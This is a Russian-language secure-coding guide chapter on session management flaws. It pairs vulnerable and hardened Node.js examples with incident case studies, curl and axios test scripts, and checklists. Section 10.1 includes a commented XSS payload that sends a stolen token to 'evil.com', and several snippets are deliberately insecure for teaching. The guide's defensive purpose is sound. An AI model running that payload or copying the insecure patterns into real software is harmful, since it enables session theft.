## 10. Session Management Issues

### Что это такое

Session Management Issues — это уязвимости в том, как приложение создает, хранит, и валидирует user sessions. Плохое управление сессиями может привести к session hijacking, fixation, или unauthorized access. На frontend это проявляется через небезопасное хранение session токенов, отсутствие timeout'ов, и недостаточную защиту от кражи.

**CVSS Score:** 6.5 - 9.1 (в зависимости от impact)
**CWE ID:** CWE-384, CWE-613, CWE-287
**OWASP Top 10:** A07:2021 – Identification and Authentication Failures

### Как работает механизм атаки

Session management атаки эксплуатируют слабости в:

1. **Session Creation:** Предсказуемые session IDs
2. **Session Storage:** Токены в localStorage (доступны через XSS)
3. **Session Validation:** Отсутствие checks на backend
4. **Session Termination:** Нет proper logout или timeout
5. **Session Fixation:** Атакующий может установить session ID жертвы

### Типы Session Management уязвимостей

#### 10.1 Session Tokens в localStorage

**Характеристики:**
- Токены хранятся в localStorage
- Доступны через JavaScript (уязвимы к XSS)
- Не имеют automatic expiration

**Уязвимый код:**
```javascript
// ❌ ОПАСНО - токен в localStorage
async function login(username, password) {
    const response = await fetch('/api/login', {
        method: 'POST',
        body: JSON.stringify({ username, password })
    });

    const { token } = await response.json();

    // ❌ Хранение в localStorage
    localStorage.setItem('authToken', token);
}

// Использование token
function makeAuthRequest(url) {
    const token = localStorage.getItem('authToken');

    return fetch(url, {
        headers: {
            'Authorization': `Bearer ${token}`
        }
    });
}

// XSS атака может украсть токен:
// <script>
//   fetch('https://evil.com/steal?token=' + localStorage.getItem('authToken'))
// </script>
```

**Impact:** КРИТИЧЕСКИЙ - кража session через XSS

#### 10.2 Отсутствие Session Timeout

**Характеристики:**
- Sessions не истекают автоматически
- "Remember me" без ограничений
- Старые sessions остаются валидными

**Уязвимый код:**
```javascript
// Backend (Node.js)
const sessions = new Map();

app.post('/login', (req, res) => {
    const user = authenticateUser(req.body);

    if (user) {
        const sessionId = generateSessionId();

        // ❌ Сессия без expiration
        sessions.set(sessionId, {
            userId: user.id,
            createdAt: Date.now()
            // Нет expiresAt!
        });

        res.json({ sessionId });
    }
});

app.get('/api/protected', (req, res) => {
    const sessionId = req.headers['session-id'];
    const session = sessions.get(sessionId);

    // ❌ Нет проверки expiration
    if (session) {
        // Allow access даже если session создана год назад!
        res.json({ data: 'sensitive' });
    }
});
```

**Impact:** ВЫСОКИЙ - prolonged unauthorized access

#### 10.3 Session Fixation

**Характеристики:**
- Приложение принимает session ID от пользователя
- Session ID не regenerated после login
- Атакующий может pre-set session ID

**Уязвимый код:**
```javascript
// ❌ Vulnerable to session fixation
app.get('/login', (req, res) => {
    let sessionId = req.cookies.sessionId;

    // Если нет session, создать новую
    if (!sessionId) {
        sessionId = generateSessionId();
        res.cookie('sessionId', sessionId);
    }

    // Render login page
    // sessionId УЖЕ установлен ПЕРЕД authentication
    res.render('login');
});

app.post('/login', (req, res) => {
    const user = authenticateUser(req.body);

    if (user) {
        const sessionId = req.cookies.sessionId;  // Использует существующий!

        // ❌ НЕ regenerated после login
        sessions.set(sessionId, { userId: user.id });

        res.redirect('/dashboard');
    }
});

// Атака:
// 1. Атакующий получает session ID: abc123
// 2. Отправляет жертве: https://app.com/login?sessionId=abc123
// 3. Жертва логинится с этим session ID
// 4. Теперь атакующий может использовать abc123 для доступа!
```

**Impact:** КРИТИЧЕСКИЙ - полная компрометация session

#### 10.4 Недостаточная Session Validation

**Характеристики:**
- Backend не проверяет session metadata
- Нет binding к IP/User-Agent
- Session reuse возможен

**Уязвимый код:**
```javascript
// ❌ Минимальная валидация
app.use((req, res, next) => {
    const sessionId = req.cookies.sessionId;
    const session = sessions.get(sessionId);

    // Только проверка существования
    if (session) {
        req.userId = session.userId;
        next();
    } else {
        res.status(401).json({ error: 'Unauthorized' });
    }

    // Нет проверки:
    // - IP address изменился?
    // - User-Agent изменился?
    // - Concurrent sessions из разных locations?
    // - Session украдена?
});
```

**Impact:** ВЫСОКИЙ - session hijacking не detected

### Реальные кейсы с финансовым impact

#### T-Mobile (2020) - Session Management Flaw

**Что произошло:**
Слабость в session management позволяла SIM swap атаки.

**Механизм:**
```
1. Атакующий получает session token (через phishing или XSS)
2. Session token не привязан к device/IP
3. Атакующий использует токен с другого устройства
4. T-Mobile не детектит anomaly
5. Атакующий получает access к account
6. Выполняет SIM swap
7. Получает SMS/2FA codes
8. Компрометация связанных аккаунтов (email, bank, crypto)
```

**Результат:**
- Множественные SIM swap атаки
- Customers потеряли cryptocurrency
- Class action lawsuits
- FCC investigation
- Increased security measures mandated

**Урок:** Session должны быть привязаны к device fingerprints и геолокации.

#### Coinbase (2019) - Session Timeout Issues

**Что произошло:**
Extended session lifetimes без proper re-authentication для sensitive operations.

**Механизм:**
```javascript
// Sessions действовали 30+ дней
// Критичные операции (withdrawal) не требовали re-auth

// Атака scenario:
// 1. Пользователь логинится на общем компьютере
// 2. Забывает logout
// 3. Session остается активной неделями
// 4. Другой человек использует компьютер
// 5. Может выполнить withdrawal без re-auth
```

**Результат:**
- Unauthorized withdrawals reported
- Enhanced security requirements:
  - Shorter session lifetimes
  - Mandatory re-auth for withdrawals
  - Device fingerprinting added
- Customer compensation for losses

**Урок:** Sensitive operations требуют re-authentication даже в valid session.

### Методы защиты

#### 1. HttpOnly Secure Cookies

**Правильное хранение sessions:**
```javascript
// ✅ Server-side (Node.js/Express)
app.post('/login', async (req, res) => {
    const user = await authenticateUser(req.body);

    if (user) {
        const sessionId = crypto.randomBytes(32).toString('hex');

        // Сохранить session на server
        sessions.set(sessionId, {
            userId: user.id,
            createdAt: Date.now(),
            expiresAt: Date.now() + (24 * 60 * 60 * 1000),  // 24 hours
            ip: req.ip,
            userAgent: req.headers['user-agent']
        });

        // ✅ HttpOnly cookie
        res.cookie('sessionId', sessionId, {
            httpOnly: true,      // Не доступен через JavaScript
            secure: true,        // Только HTTPS
            sameSite: 'strict',  // CSRF protection
            maxAge: 24 * 60 * 60 * 1000  // 24 hours
        });

        res.json({ success: true });
    }
});
```

#### 2. Session Regeneration после Login

**Предотвращение fixation:**
```javascript
// ✅ Regenerate session ID efter успешного login
app.post('/login', (req, res) => {
    const user = authenticateUser(req.body);

    if (user) {
        // Получить старую session
        const oldSessionId = req.cookies.sessionId;

        // Удалить старую session
        if (oldSessionId) {
            sessions.delete(oldSessionId);
        }

        // ✅ Создать НОВУЮ session
        const newSessionId = crypto.randomBytes(32).toString('hex');

        sessions.set(newSessionId, {
            userId: user.id,
            createdAt: Date.now()
        });

        // Установить новый cookie
        res.cookie('sessionId', newSessionId, {
            httpOnly: true,
            secure: true,
            sameSite: 'strict'
        });

        res.json({ success: true });
    }
});
```

#### 3. Session Validation с Metadata

**Полная валидация:**
```javascript
// ✅ Comprehensive session validation
function validateSession(req) {
    const sessionId = req.cookies.sessionId;
    const session = sessions.get(sessionId);

    if (!session) {
        return null;
    }

    // Check 1: Expiration
    if (Date.now() > session.expiresAt) {
        sessions.delete(sessionId);
        return null;
    }

    // Check 2: IP binding (опционально, может сломать для mobile users)
    if (session.ip && session.ip !== req.ip) {
        console.warn(`[SECURITY] IP mismatch for session ${sessionId}`);
        // Опционально: требовать re-auth
    }

    // Check 3: User-Agent consistency
    if (session.userAgent !== req.headers['user-agent']) {
        console.warn(`[SECURITY] User-Agent mismatch for session ${sessionId}`);
        // Опционально: требовать re-auth
    }

    // Check 4: Idle timeout (30 min of inactivity)
    const idleTime = Date.now() - session.lastActivity;
    if (idleTime > 30 * 60 * 1000) {
        sessions.delete(sessionId);
        return null;
    }

    // Update last activity
    session.lastActivity = Date.now();

    return session;
}

// Middleware
app.use((req, res, next) => {
    const session = validateSession(req);

    if (!session && requiresAuth(req.path)) {
        return res.status(401).json({ error: 'Unauthorized' });
    }

    req.session = session;
    next();
});
```

#### 4. Automatic Session Timeout

**Client и Server-side timeouts:**
```javascript
// Client-side idle detection
let idleTimer;
let idleTimeout = 30 * 60 * 1000;  // 30 minutes

function resetIdleTimer() {
    clearTimeout(idleTimer);
    idleTimer = setTimeout(logoutUser, idleTimeout);
}

// Reset на user activity
['mousedown', 'mousemove', 'keypress', 'scroll', 'touchstart'].forEach(event => {
    document.addEventListener(event, resetIdleTimer, true);
});

// Initial start
resetIdleTimer();

function logoutUser() {
    fetch('/api/logout', { method: 'POST' })
        .then(() => {
            window.location.href = '/login?reason=timeout';
        });
}

// Server-side automatic cleanup
setInterval(() => {
    const now = Date.now();

    for (const [sessionId, session] of sessions.entries()) {
        // Remove expired sessions
        if (now > session.expiresAt) {
            sessions.delete(sessionId);
            console.log(`[CLEANUP] Removed expired session: ${sessionId}`);
        }

        // Remove idle sessions
        const idleTime = now - (session.lastActivity || session.createdAt);
        if (idleTime > 30 * 60 * 1000) {
            sessions.delete(sessionId);
            console.log(`[CLEANUP] Removed idle session: ${sessionId}`);
        }
    }
}, 5 * 60 * 1000);  // Cleanup каждые 5 минут
```

#### 5. Re-authentication для Sensitive Operations

**Step-up authentication:**
```javascript
// ✅ Требовать re-auth для critical operations
app.post('/api/transfer-money', (req, res) => {
    const session = req.session;

    // Check если недавно re-authenticated
    const timeSinceAuth = Date.now() - (session.lastReAuth || 0);
    const reAuthRequired = timeSinceAuth > 5 * 60 * 1000;  // 5 minutes

    if (reAuthRequired) {
        return res.status(403).json({
            error: 'Re-authentication required',
            reAuthToken: generateReAuthToken()
        });
    }

    // Proceed с transfer
    performMoneyTransfer(req.body);
});

// Re-authentication endpoint
app.post('/api/re-authenticate', (req, res) => {
    const { password, reAuthToken } = req.body;

    if (verifyReAuthToken(reAuthToken) && verifyPassword(req.session.userId, password)) {
        req.session.lastReAuth = Date.now();
        res.json({ success: true });
    } else {
        res.status(401).json({ error: 'Invalid password' });
    }
});
```

#### 6. Concurrent Session Management

**Limit simultaneous sessions:**
```javascript
// Track sessions per user
const userSessions = new Map();  // userId -> Set of sessionIds

app.post('/login', (req, res) => {
    const user = authenticateUser(req.body);

    if (user) {
        const sessionId = crypto.randomBytes(32).toString('hex');

        // ✅ Track user sessions
        if (!userSessions.has(user.id)) {
            userSessions.set(user.id, new Set());
        }

        const userSessionSet = userSessions.get(user.id);

        // Limit to 3 concurrent sessions
        if (userSessionSet.size >= 3) {
            // Удалить oldest session
            const oldestSessionId = Array.from(userSessionSet)[0];
            sessions.delete(oldestSessionId);
            userSessionSet.delete(oldestSessionId);
        }

        // Add new session
        userSessionSet.add(sessionId);

        sessions.set(sessionId, { userId: user.id });

        res.cookie('sessionId', sessionId, {
            httpOnly: true,
            secure: true,
            sameSite: 'strict'
        });

        res.json({ success: true });
    }
});
```

### Как тестировать

#### Ручное тестирование

**1. Session storage проверка:**
```javascript
// В DevTools Console
console.log('localStorage:', localStorage);
console.log('sessionStorage:', sessionStorage);
console.log('cookies:', document.cookie);

// Проверить:
// - Есть ли tokens в localStorage? ❌
// - Cookies имеют HttpOnly? ✅
// - Cookies имеют Secure? ✅
```

**2. Session timeout testing:**
```bash
# 1. Login и получить session cookie
curl -c cookies.txt -X POST https://app.com/login \
  -d '{"username":"test","password":"test"}'

# 2. Подождать (например, 31 минуту для 30-min timeout)
sleep 1860

# 3. Попытка доступа с expired session
curl -b cookies.txt https://app.com/api/protected

# Должен вернуть 401 Unauthorized
```

**3. Session fixation testing:**
```bash
# 1. Получить session ID BEFORE login
curl -c cookies.txt https://app.com/login

# Note session ID
cat cookies.txt | grep sessionId

# 2. Login с тем же session ID
curl -b cookies.txt -c cookies.txt -X POST https://app.com/login \
  -d '{"username":"test","password":"test"}'

# 3. Проверить - изменился ли session ID?
cat cookies.txt | grep sessionId

# Если НЕ изменился - VULNERABLE ❌
```

#### Автоматизированное тестирование

**Burp Suite Session Management Scanner:**
```
1. Spider application с authenticated user
2. Scanner → Session Handling
3. Test для:
   - Session fixation
   - Session timeout
   - Concurrent session handling
   - Session token entropy
```

**Custom test script:**
```javascript
// test-session-management.js
const axios = require('axios');

async function testSessionManagement(baseUrl) {
    console.log('[*] Testing Session Management...\n');

    // Test 1: Session fixation
    console.log('[1] Testing session fixation...');
    const preLoginCookies = await getSessionCookie(baseUrl + '/login');
    const postLoginCookies = await login(baseUrl, preLoginCookies);

    if (preLoginCookies === postLoginCookies) {
        console.log('[VULN] Session ID not regenerated after login!');
    } else {
        console.log('[SAFE] Session ID regenerated ✓');
    }

    // Test 2: Session timeout
    console.log('\n[2] Testing session timeout...');
    // Implementation...

    // Test 3: HttpOnly cookie
    console.log('\n[3] Testing HttpOnly flag...');
    // Check cookie attributes via browser or curl
}

async function getSessionCookie(url) {
    const response = await axios.get(url);
    return response.headers['set-cookie']?.[0]?.match(/sessionId=([^;]+)/)?.[1];
}

async function login(baseUrl, existingCookie) {
    const response = await axios.post(baseUrl + '/login', {
        username: 'test',
        password: 'test'
    }, {
        headers: existingCookie ? { Cookie: `sessionId=${existingCookie}` } : {}
    });

    return response.headers['set-cookie']?.[0]?.match(/sessionId=([^;]+)/)?.[1];
}

testSessionManagement('https://target.com');
```

### Контрольный чеклист

**Для разработчиков:**
- [ ] Session tokens в HttpOnly Secure cookies (НЕ localStorage!)
- [ ] Session ID regenerated efter successful login
- [ ] Session expiration настроен (абсолютный + idle timeout)
- [ ] Session validation включает metadata (IP, User-Agent - опционально)
- [ ] Re-authentication required для sensitive operations
- [ ] Proper logout функционал (server-side session destruction)
- [ ] Concurrent session limiting реализован
- [ ] Session tokens криптографически случайны (crypto.randomBytes)

**Для security review:**
- [ ] Penetration testing с session fixation attempts
- [ ] Session hijacking scenarios tested
- [ ] Session timeout properly enforced
- [ ] Cookie flags verified (HttpOnly, Secure, SameSite)
- [ ] No session tokens в URLs или logs

**Для critical applications:**
- [ ] Device fingerprinting для anomaly detection
- [ ] Geographic anomaly detection
- [ ] Session activity logging
- [ ] User notification on new session creation
- [ ] Admin panel для session management
- [ ] Incident response plan для compromised sessions

